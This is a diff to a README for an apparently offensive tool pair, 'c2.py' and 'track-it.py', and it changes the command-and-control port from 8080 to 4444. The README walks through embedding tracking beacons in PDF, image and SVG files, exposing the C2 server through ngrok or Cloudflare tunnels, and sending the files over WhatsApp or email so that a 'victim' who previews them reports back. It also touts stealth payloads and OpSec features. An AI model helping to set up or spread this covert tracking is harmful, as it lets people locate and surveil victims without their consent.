@@ -82,8 +82,8 @@ python3 track-it.py test.pdf tracked.pdf --url YOUR_URL/beacon
 python3 c2.py
 ```
 ```
-🚀 C2 started: http://localhost:8080
-📡 Beacon:    http://localhost:8080/beacon
+🚀 C2 started: http://localhost:4444
+📡 Beacon:    http://localhost:4444/beacon
 🌐 Start tunnel → Press Enter
 ```
 
@@ -96,14 +96,14 @@ python3 c2.py
 
 | **Tunnel** | **Command** | **Free?** | **HTTPS?** |
 |------------|-------------|-----------|------------|
-| **Ngrok** | `ngrok http 8080` | ✅ Free tier | ✅ |
-| **Cloudflare** | `cloudflared tunnel --url localhost:8080` | ✅ Forever | ✅ |
-| **LocalTunnel** | `npx localtunnel --port 8080` | ✅ No signup | ✅ |
+| **Ngrok** | `ngrok http 4444` | ✅ Free tier | ✅ |
+| **Cloudflare** | `cloudflared tunnel --url localhost:4444` | ✅ Forever | ✅ |
+| **LocalTunnel** | `npx localtunnel --port 4444` | ✅ No signup | ✅ |
 
 **Example Output:**
 ```
-ngrok http 8080
-# Forwarding  https://abc123.ngrok.io → localhost:8080
+ngrok http 4444
+# Forwarding  https://abc123.ngrok.io → localhost:4444
 ```
 
 #### **Option A: Ngrok (install + config)**
@@ -123,7 +123,7 @@ version: "2"
 authtoken: YOUR_ACTUAL_TOKEN_HERE
 tunnels:
   tracker:
-    addr: 8080
+    addr: 4444
     proto: http
 EOF
 # Then run: ngrok start tracker
@@ -146,7 +146,7 @@ cat > tunnels/cloudflare.json << 'EOF'
   "tunnel": "tracker-ID-FROM-cloudflared",
   "credentials-file": "/root/.cloudflared/YOUR_CREDENTIALS.json",
   "ingress": [
-    {"hostname": "tracker.yourdomain.com", "service": "http://localhost:8080"},
+    {"hostname": "tracker.yourdomain.com", "service": "http://localhost:4444"},
     {"service": "http_status:404"}
   ]
 }
@@ -163,7 +163,7 @@ Uses only the existing scripts (`c2.py`, `track-it.py`) and ngrok—no `tunnels/
 python3 c2.py
 
 # Terminal 2: Direct tunnel (no config file)
-ngrok http 8080
+ngrok http 4444
 # Copy the URL, e.g. https://abc123.ngrok.io
 
 # Terminal 3: Track a file (track-it.py; replace with your ngrok URL)
@@ -193,7 +193,7 @@ python3 track-it.py photo.jpg whatsapp_photo.svg --url https://c2.ngrok.io/beaco
 ```bash
 # 1. Send tracked.pdf → WhatsApp/Email
 # 2. Victim previews file
-# 3. Watch: http://localhost:8080 🎯
+# 3. Watch: http://localhost:4444 🎯
 ```
 
 ## 🔍 **Supported Formats & Vectors**
@@ -223,7 +223,7 @@ ghi789jkl012...   win          172.16.1.200  desktop-3  Windows Explorer        
 
 ### **OpSec Features**
 ```
-✅ Local-only dashboard (127.0.0.1:8080)
+✅ Local-only dashboard (127.0.0.1:4444)
 ✅ HTTPS tunnels (WhatsApp compliant)
 ✅ No persistence beyond SQLite
 ✅ Stealth payloads (+0-200 bytes)
@@ -253,7 +253,7 @@ ghi789jkl012...   win          172.16.1.200  desktop-3  Windows Explorer        
 docker build -t track-it .
 
 # Run (persists data)
-docker run -p 8080:8080 -v $(pwd)/data:/app/data track-it
+docker run -p 4444:4444 -v $(pwd)/data:/app/data track-it
 ```
 
 ## 💾 **Data Export**
